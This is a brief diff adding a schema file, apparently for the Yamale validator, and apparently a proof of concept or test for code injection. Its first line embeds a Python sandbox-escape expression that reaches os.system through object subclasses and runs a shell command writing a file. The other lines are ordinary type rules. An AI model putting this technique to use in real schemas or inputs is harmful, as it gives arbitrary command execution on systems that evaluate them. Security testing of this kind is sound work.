@@ -1,0 +1,4 @@
+name: str([x.__init__.__globals__["sys"].modules["os"].system("echo 'test' > test") for x in ''.__class__.__base__.__subclasses__() if "_ModuleLock" == x.__name__])
+age: int(max=200)
+height: num()
+awesome: bool()
